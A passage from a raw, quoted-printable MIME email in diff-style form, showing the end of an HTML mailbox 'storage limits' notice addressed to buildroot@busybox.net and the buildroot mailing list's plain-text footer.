+t" rel=3D"noreferrer"><strong>storage limits</strong></a><strong>"</strong>=
+<span>&nbsp;</span>&nbsp;&nbsp;for&nbsp;more help and&nbsp;support.</span><=
+/p>
+<p style=3D'text-align: center; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-=
+serif; font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0=
+px; margin-bottom: 0px; word-spacing: 0px; white-space: normal; box-sizing:=
+ border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); f=
+ont-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
+ke-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'><b style=
+=3D"font-weight: bolder; box-sizing: border-box;"><span style=3D"box-sizing=
+: border-box;">Mailbox address:<br style=3D"box-sizing: border-box;"></span=
+></b><span style=3D"box-sizing: border-box;"><a style=3D"color: rgb(0, 172,=
+ 255); text-decoration: none; box-sizing: border-box; background-color: tra=
+nsparent;" href=3D"mailto:buildroot@busybox.net" rel=3D"noreferrer">buildro=
+ot@busybox.net</a></span></p></body></html>
+
+--===============7099786633863257896==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+buildroot mailing list
+buildroot@buildroot.org
+https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============7099786633863257896==--
